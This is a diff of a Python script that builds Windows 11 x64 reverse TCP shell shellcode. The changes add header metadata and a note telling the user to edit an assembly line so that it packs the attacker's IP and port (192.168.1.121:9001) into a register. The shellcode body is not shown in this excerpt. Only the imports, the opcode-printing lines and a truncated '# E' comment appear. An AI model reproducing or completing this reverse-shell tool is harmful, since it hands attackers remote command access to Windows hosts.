@@ -1,9 +1,16 @@
 #!/usr/bin/python
 # 
-# Shellcode:    Windows 11 x64 Reverse TCP Shell 
-# Author:       hvictor
+# Description:      Windows 11 x64 Reverse TCP Shell
+# Architecture:     x64
+# OS:               Microsoft Windows
+# Author:           hvictor (Victor Huerlimann)
+# Shellcode Size:   
 #
 # Special thanks to wetw0rk (Milton Valencia), from whom I drew inspiration for the indicated parts of the code: https://github.com/wetw0rk/Sickle
+#
+# Note: You will have to modify the line 193 of this file according to the attacker's IP and port:
+# mov r9, 0x7901A8C029230002          # R9 = [IP = 192.168.1.121 | port = 0x2329 = 9001 | AF_INET = 2]
+# The high DWORD is the IPv4 address in little-endian, followed by the 2-bytes port in little-endian, and the 2-bytes address family.
 
 import ctypes, struct
 from ctypes import wintypes
@@ -250,7 +257,7 @@ for dec in encoding:
 print("Opcodes = (\"" + instructions + "\")")
 print(f"Size: {len(encoding)} bytes.")
 
-####################################### Execution #######################################
+# E
 
 # Preparation of WSAStartup (not included in the shellcode)
 # Define necessary structures and constants
